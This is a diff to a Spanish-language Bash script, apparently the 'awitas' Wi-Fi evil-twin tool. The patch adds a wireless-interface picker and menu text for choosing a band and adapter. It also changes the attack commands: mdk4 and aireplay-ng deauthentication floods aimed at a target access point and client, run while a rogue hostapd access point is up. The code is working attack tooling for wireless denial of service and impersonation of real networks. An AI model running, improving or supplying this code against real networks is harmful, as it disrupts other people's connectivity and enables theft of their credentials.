@@ -70,6 +70,50 @@ for proceso in lighttpd opennds dnsmasq hostapd wpa_supplicant ;do
 done
 kill -9 $$ >/dev/null 1>&2 && exit 
 }
+function eleccion_dispositivo () {
+echo;echo " Lista de dispositivos disponibles:";echo
+rm ${pwd}lista_interfaces 2>/dev/null
+iw dev | grep -oP 'Interface \K\S+' >${pwd}lista_interfaces 
+cuenta=1
+for i in `cat ${pwd}lista_interfaces`; do
+rm ${pwd}$i 2>/dev/null
+touch ${pwd}$i 
+driver=$(ethtool -i $i | grep driver | cut -d ':' -f2)
+echo "driver: $(ethtool -i $i | grep driver | cut -d ':' -f2)" >> ${pwd}$i
+phy=$(cat /sys/class/net/${i}/phy80211/name)
+echo "phy: $(cat /sys/class/net/${i}/phy80211/name)" >> ${pwd}$i
+iw phy $phy info | awk '/^[[:blank:]]*\* monitor/' &>/dev/null
+if [ $? -eq 0 ];then
+        monitor=${VERDE}si${NORMAL}
+else
+        monitor=${ROJO}no${NORMAL}
+fi
+iw phy $phy info | awk '/^[[:blank:]]*\* AP$/' | grep AP &>/dev/null
+if [ $? -eq 0 ];then
+        AP=${VERDE}si${NORMAL}
+else
+        AP=${ROJO}no${NORMAL}
+fi
+iw phy $(grep phy ${pwd}$i | cut -d ':' -f2) info | grep -A 4 Frequencies | grep 2412 &>/dev/null
+if [ $? -eq 0 ];then
+        b24=${VERDE}si${NORMAL}
+        echo "banda:24">>${pwd}$i
+else
+        b24=${ROJO}no${NORMAL}
+fi
+iw phy $(grep phy ${pwd}$i | cut -d ':' -f2) info | grep -A 4 Frequencies | grep 5180 &>/dev/null
+if [ $? -eq 0 ];then
+        b5=${VERDE}si${NORMAL}
+        echo "banda:5">>${pwd}$i
+else
+        b5=${ROJO}no${NORMAL}
+fi
+echo "  $i (${phy}) ${VIOLETA}|${NORMAL} 2,4GHz: $b24 ${VIOLETA}|${NORMAL} 5GHz: $b5 ${VIOLETA}|${NORMAL} modo monitor: $monitor ${VIOLETA}|${NORMAL} Modo AP: $AP ${VIOLETA}|${NORMAL} driver:${VERDE}${driver}${NORMAL}"
+unset driver phy 24 5 monitor AP
+((cuenta++))
+done
+echo
+}
 function abierto () {
 /etc/init.d/wpa_supplicant stop &>/dev/null
 systemctl stop wpa_supplicant.service &>/dev/null
@@ -461,7 +505,7 @@ elif [ "$modelo" == "ZTE" ];then
 fi
 }
 function berate_confirmado() {
-echo -e "${AMARILLO}[AP]${BLANCO}	Levantando punto de aceso... Si no pasas de esta pantalla, revisa que tu dispositivo sopote el modo AP.${BLANCO}"
+echo -e "${AMARILLO}[AP]${BLANCO}	Levantando punto de acceso... Si no pasas de esta pantalla, revisa que tu dispositivo sopote el modo AP.${BLANCO}"
 while :
 do
 	grep ENABLE ${pwd}hostapd &>/dev/null
@@ -673,7 +717,7 @@ do
     		monitor poner  &>/dev/null
 	fi
 	if [ "$mdk4" = "si" ];then
-		timeout --preserve-status --foreground $tiempo_mdk4 mdk4 $iface_mon e -t $macap -l &>>${pwd}mdk4
+		timeout --preserve-status --foreground $tiempo_mdk4 mdk4 $iface_mon d -c $canal -B $macap -S $mac_estacion &>>${pwd}mdk4
 	else
 		aireplay-ng -0 $desaut -a $macap -c $mac_estacion $iface_mon --ignore-negative-one &>>${pwd}aireplay
 	fi
@@ -864,8 +908,8 @@ if [ $? -ne 0  ];then
 	clear
 	banner
 	echo;echo -e "${AMARILLO}[::]${BLANCO} Como quieres hacer el DoS?"
-	echo;echo -e "${AMARILLO}  1)${BLANCO}  Aireplay dirigido a un solo cliente."
-	echo -e "${AMARILLO}  2)${BLANCO}  Mdk4 contra todos los clientes de la red."
+	echo;echo -e "${AMARILLO}  1)${BLANCO}  Aireplay."
+	echo -e "${AMARILLO}  2)${BLANCO}  Mdk4."
 	echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
 	read opcion
 	if [ -z $opcion ];then
@@ -1008,7 +1052,7 @@ function empezar () {
 clear
 banner
 echo;echo -e "${CYAN} En la cabecera del sript puedes configurar algunas cosas. Quiza te venga bien."
-echo;echo -e "${AMARILLO}[::]${BLANCO} Bienvenido a awitas."
+echo;echo -e "${AMARILLO}[::]${BLANCO} Bienvenido a awitas. Un poco de paciencia, se esta cociendo..."
 if [ ! -e oui.txt ] && [ "$openwrt" != "1" ];then
 	echo -e "${ROJO}[!!]${BLANCO} No tienes el archivo oui.txt. Este archivo servira para aportar informacion sobre los dispositivos que tratemos de atacar. No es necesario, pero es aconsejable.";echo
 	echo -e "${AMARILLO}[::]${BLANCO} Escribe \"si\" para descargarlo o enter para no hacerlo. Si lo descargas ya no volveras a ver este mensaje. Escribe "cansino" si no quieres vover a ver este mensaje, pero tampoco descargar el archivo.  "
@@ -1032,6 +1076,8 @@ if [ "$openwrt" != "1" ];then
 	systemctl stop NetworkManager.service >/dev/null 2>&1
 	service wpa_supplicant stop >/dev/null 2>&1
 fi
+eleccion_dispositivo
+echo -e "${AMARILLO}[::]${BLANCO} Para hacer el ataque en la banda de 5 GHz, necesitamos que el dispositivo que haga el DoS inyecte en la banda de 5 GHz"
 echo -e "${AMARILLO}[::]${BLANCO} Elige la banda en la que haremos el ataque:";echo
 echo -e "${AMARILLO}  1)${BLANCO}   Banda de 5 GHz."
 echo -e "${AMARILLO}  2)${BLANCO}   Banda de 2,4 GHz."
@@ -1062,15 +1108,12 @@ else
 	echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hara sobre la banda de 2,4 GHz"
 fi
 echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que vamos a hacer es elegir un dispositivo para crear nuestro punto de acceso."
+echo -e "${AMARILLO}[::]${BLANCO} El punto de acceso siempre se hara sobre la banda de 2,4 GHz, por lo que no es necesario que el dispositivo trabaje en 5 GHz"
 echo -e "${AMARILLO}[::]${BLANCO} Por favor, ten en cuenta que el dispositivo tiene que soportar la opcion de crear puto de acceso."
-echo -ne "${AMARILLO}[::]${BLANCO} Pulsa enter para elegir dispositivo"
-read
-echo;echo -e "${AMARILLO}[::]${BLANCO} Estos son tus dispositivos:";echo
-airmon-ng 2>/dev/null  | cut  -f2-10
-airmon-ng 2>/dev/null  | cut  -f2-10 | grep -v Interface | sed '/^ *$/d' > ${pwd}airmon 2>/dev/null
+eleccion_dispositivo
 echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para crear nuestro punto de acceso.";echo
 cuenta=1
-for i in `cat ${pwd}airmon | cut -f1`
+for i in `cat ${pwd}lista_interfaces`
 do
 	echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
 	cuenta=$((cuenta+1))
@@ -1095,7 +1138,7 @@ fi
 validar_numero $opcion empezar
 if [ $opcion -le $cuenta ]; then
 	cuenta=$((cuenta+1))
-	sed -n ${opcion}p ${pwd}airmon | cut -f 1 >${pwd}iface_ap
+	sed -n ${opcion}p ${pwd}lista_interfaces | cut -f 1 >${pwd}iface_ap
 	iface_ap=`cat ${pwd}iface_ap`
 	echo -e "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_ap ${BLANCO}para crear nuestro punto de acceso. Pulsa enter para continuar."
 	read
@@ -1111,13 +1154,14 @@ clear
 banner
 echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera elegir un dispositivo para el ataque DoS."
 echo -e "${AMARILLO}[::]${BLANCO} Debes estar seguro de que el dispositivo tiene la capacidad de inyectar paquetes."
-echo -e -e "${AMARILLO}[::]${BLANCO} Pulsa enter para continuar."
-read
+echo -e "${AMARILLO}[::]${BLANCO} Recuerda que si estamos haciendo el ataque en la banda de 5 GHz, necesitamos que este dispotivo trabaje en la banda de 5GHz"
+echo;echo "${ROJO} ATENCION!!${NORMAL} Que un dispositivo acepte el modo monitor no significa necesariamente que pueda hacer"
+echo " un ataque de desautenticacion. Tendras que hacer tus propias pruebas para estar seguro.";echo
+eleccion_dispositivo
 echo -e  "${AMARILLO}[::]${BLANCO} Estos son los dispositivos que quedan disponibles:"
-airmon-ng 2>/dev/null  | cut  -f2-10 | grep -v $iface_ap
 echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para hacer el ataque de desautenticacion (DoS)";echo
 cuenta=1
-for i in `cat ${pwd}airmon | grep -v $iface_ap | cut -f1`
+for i in `cat ${pwd}lista_interfaces | grep -v $iface_ap`
 do
 	echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
 	cuenta=$((cuenta+1))
@@ -1133,7 +1177,7 @@ validar_numero $opcion elegir_monitor
 cuenta=$((cuenta-1))
 if [ $opcion -le $cuenta ]; then
 	cuenta=$((cuenta+1))
-  	cat ${pwd}airmon | grep -v $iface_ap| sed  -n ${opcion}p | cut -f 1 >${pwd}iface_dos
+  	cat ${pwd}lista_interfaces | grep -v $iface_ap| sed  -n ${opcion}p | cut -f 1 >${pwd}iface_dos
 	iface_dos=`cat ${pwd}iface_dos`
 	echo -ne "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_dos${BLANCO} para crear nuestro ataque DoS. Pulsa enter para continuar"
 	read
